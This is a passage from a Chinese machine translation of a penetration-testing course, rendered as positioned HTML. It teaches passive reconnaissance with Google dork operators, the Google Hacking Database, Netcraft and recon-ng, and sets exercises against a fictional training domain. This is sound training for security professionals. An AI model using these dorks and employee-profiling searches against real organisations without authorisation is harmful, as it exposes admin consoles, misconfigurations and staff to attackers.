<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:165794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.4 谷歌黑客</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“Google Hacking”一词由 Johnny Long 于 2001 年普及。通过几次谈话</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">142</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:165855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一本非常受欢迎的书（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Google Hacking for Penetration Testers </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">143</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），他概述了搜索</font></font></nobr></div>
<div style="position:absolute;top:165875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">谷歌等引擎可用于发现关键信息、漏洞和错误配置</font></font></nobr></div>
<div style="position:absolute;top:165894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站。</font></font></nobr></div>
<div style="position:absolute;top:165927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种技术的核心是巧妙的搜索字符串和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运算符</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">144</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它们允许创造性的</font></font></nobr></div>
<div style="position:absolute;top:165946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索查询的细化，其中大部分都适用于各种搜索引擎。</font><font style="vertical-align: inherit;">过程是</font></font></nobr></div>
<div style="position:absolute;top:165965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迭代，从广泛的搜索开始，用运算符缩小范围以筛选出不相关的</font></font></nobr></div>
<div style="position:absolute;top:165985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或无趣的结果。</font></font></nobr></div>
<div style="position:absolute;top:166018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试其中的一些运算符，并了解它们的工作原理。</font></font></nobr></div>
<div style="position:absolute;top:166051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运营商限制搜索到一个域名。</font><font style="vertical-align: inherit;">我们可以使用这个运算符来粗略地了解一下</font></font></nobr></div>
<div style="position:absolute;top:166070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织的网络存在：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:166313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">142 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Google_hacking</font></font></font></nobr></div>
<div style="position:absolute;top:166333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">143 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（约翰尼·朗、比尔·加德纳、贾斯汀·布朗，2015 年），https://www.amazon.com/Google-Hacking-Penetration-Testers-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:166348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">约翰尼/dp/0128029641/ref=dp_ob_image_bk</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:166367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">144 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（谷歌，2019 年），https://support.google.com/websearch/answer/2466433?hl=en</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:166495;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="141"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 141 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:166528;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:167605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:167605;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:167605;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">141</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:167116;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 22：使用站点操作员进行搜索</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后我们可以使用更多的运算符来缩小这些结果的范围。</font><font style="vertical-align: inherit;">例如，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件类型</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ext</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></nobr></div>
<div style="position:absolute;top:167166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运算符将搜索结果限制为指定的文件类型。</font></font></nobr></div>
<div style="position:absolute;top:167199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们结合操作符来定位 PHP 文件 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">filetype:php</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:167218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">站点：megacorpone.com</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:167683;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="142"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 142 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:167716;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:168793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:168793;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:168793;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">142</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:168137;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 23：使用文件类型运算符进行搜索</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:168168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们只得到一个结果，但这是一个有趣的结果。</font><font style="vertical-align: inherit;">我们的查询找到了一个实例的登录页面</font></font></nobr></div>
<div style="position:absolute;top:168187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AlienVault OSSIM 的</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">145</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全信息和事件管理 (SIEM) 平台。</font><font style="vertical-align: inherit;">安全</font></font></nobr></div>
<div style="position:absolute;top:168207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">团队使用 SIEM 工具来监控恶意活动的应用程序和网络流量。</font><font style="vertical-align: inherit;">通常</font></font></nobr></div>
<div style="position:absolute;top:168226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些工具仅在内部网络上可用。</font><font style="vertical-align: inherit;">我们应该注意这个 URL，因为它可能被证明是有用的</font></font></nobr></div>
<div style="position:absolute;top:168246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们可以在主动利用阶段找到要登录的用户凭据。</font></font></nobr></div>
<div style="position:absolute;top:168278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分机</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运营商也可帮助辨别什么编程语言可能会在使用</font></font></nobr></div>
<div style="position:absolute;top:168297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个网站。</font><font style="vertical-align: inherit;">诸如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ext:jsp</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ext:cfm</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ext:pl 之类的搜索</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将找到索引的 Java Server Pages、Coldfusion 和</font></font></nobr></div>
<div style="position:absolute;top:168317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Perl 页面分别。</font></font></nobr></div>
<div style="position:absolute;top:168350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改运算符</font><font style="vertical-align: inherit;">以从搜索中排除特定项目，缩小搜索范围</font></font></nobr></div>
<div style="position:absolute;top:168369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果。</font></font></nobr></div>
<div style="position:absolute;top:168402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，要查找有趣的非 HTML 页面，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">site:megacorpone.com</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来限制</font></font></nobr></div>
<div style="position:absolute;top:168421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索 megacorpone.com 和子域，然后是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-filetype:html</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以排除 HTML</font></font></nobr></div>
<div style="position:absolute;top:168441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果页面：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:168743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">145 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（美国电话电报公司，2019 年），https://cybersecurity.att.com/products/ossim</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:168871;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="143"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 143 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:168904;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:169981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:169981;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:169981;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">143</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:169492;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 24：使用排除运算符进行搜索</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:169523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本例中，我们发现了几个有趣的页面，包括一个管理控制台。</font></font></nobr></div>
<div style="position:absolute;top:169555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在另一个例子中，我们可以使用搜索</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">intitle:“index of”“parent directory”</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来查找</font></font></nobr></div>
<div style="position:absolute;top:169575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题中包含“index of”并在页面上包含“父目录”字样的页面。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:170059;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="144"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 144 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:170092;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:171169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:171169;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:171169;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">144</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:170714;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 25：使用 Google 查找目录列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:170745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出是指</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录列表</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">146</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页，列出了目录的文件内容，没有</font></font></nobr></div>
<div style="position:absolute;top:170765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">索引页。</font><font style="vertical-align: inherit;">像这样的错误配置可能会泄露有趣的文件和敏感信息。</font></font></nobr></div>
<div style="position:absolute;top:170797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些基本示例仅触及了我们可以使用搜索运算符执行的操作的皮毛。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:170817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">谷歌黑客数据库 (GHDB) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">147</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含大量创造性的搜索，证明</font></font></nobr></div>
<div style="position:absolute;top:170836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用组合运算符进行创造性搜索的力量：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:171099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">146 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（MITRE，2019 年），https://cwe.mitre.org/data/definitions/548.html</font></font></font></nobr></div>
<div style="position:absolute;top:171119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">147 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.exploit-db.com/google-hacking-database</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:171247;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="145"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 145 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:171280;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:172357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:172357;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:172357;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">145</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:171801;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 26：Google 黑客数据库 (GHDB)</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">掌握这些操作符，再加上敏锐的推理能力，是有效的关键技能。</font></font></nobr></div>
<div style="position:absolute;top:171852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索引擎“黑客”。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:171886;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.4.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 谁是 MegaCorp One 的法律副总裁，他们的电子邮件地址是什么？</font></font></nobr></div>
<div style="position:absolute;top:171945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 Google dorks（您自己的或 GHDB 中的任何一个）进行搜索</font></font></nobr></div>
<div style="position:absolute;top:171964;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com 获取有趣的文档。</font></font></nobr></div>
<div style="position:absolute;top:171992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 你还能认出哪些 MegaCorp One 员工没有列出</font></font></nobr></div>
<div style="position:absolute;top:172012;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com？</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:172049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.5 网络技术</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:172090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcraft </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">148</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一家位于英国的互联网服务公司，提供免费的门户网站，</font></font></nobr></div>
<div style="position:absolute;top:172110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行各种信息收集功能。</font><font style="vertical-align: inherit;">使用服务，例如由</font></font></nobr></div>
<div style="position:absolute;top:172129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcraft 被认为是一种被动技术，因为我们从不直接与目标交互。</font></font></nobr></div>
<div style="position:absolute;top:172162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们回顾一下 Netcraft 的一些功能。</font><font style="vertical-align: inherit;">例如，我们可以使用 Netcraft 的 DNS 搜索页面</font></font></nobr></div>
<div style="position:absolute;top:172181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://searchdns.netcraft.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 收集有关</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域的信息：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:172307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">148 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Netcraft，2019 年），https://www.netcraft.com/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:172435;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="146"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 146 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:172468;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:173545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:173545;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:173545;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">146</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:172935;left:291"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 27：*.megacorpone.com 搜索的 Netcraft 结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:172967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于找到的每台服务器，我们可以查看提供附加信息和历史记录的“站点报告”</font></font></nobr></div>
<div style="position:absolute;top:172986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过单击每个站点 URL 旁边的文件图标来了解服务器。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:173623;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="147"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 147 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:173656;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:174733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:174733;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:174733;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">147</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:174287;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 28：www.megacorpone.com 的 Netcraft 站点报告</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:174318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告的开头涵盖了注册信息。</font><font style="vertical-align: inherit;">然而，如果我们向下滚动，我们会发现</font></font></nobr></div>
<div style="position:absolute;top:174338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种“站点技术”条目： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:174811;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="148"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 148 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:174844;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:175921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:175921;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:175921;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">148</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:175476;left:301"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 29：www.megacorpone.com 的站点技术</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:175506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着我们转向活动信息，这个子域和技术列表将被证明是有用的</font></font></nobr></div>
<div style="position:absolute;top:175526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">采集和利用。</font><font style="vertical-align: inherit;">现在，我们将它添加到我们的笔记中。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:175560;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.5.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:175590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Netcraft 确定 www.megacorpone.com 上运行的应用程序服务器。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:175628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.6 侦察</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:175669;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">recon-ng </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">149</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个基于模块的框架，用于基于网络的信息收集。</font><font style="vertical-align: inherit;">重组显示</font></font></nobr></div>
<div style="position:absolute;top:175689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个模块的结果到终端，但它也将它们存储在数据库中。</font><font style="vertical-align: inherit;">大部分的权力</font></font></nobr></div>
<div style="position:absolute;top:175708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">recon-ng 在于将一个模块的结果输入另一个模块，使我们能够快速扩展</font></font></nobr></div>
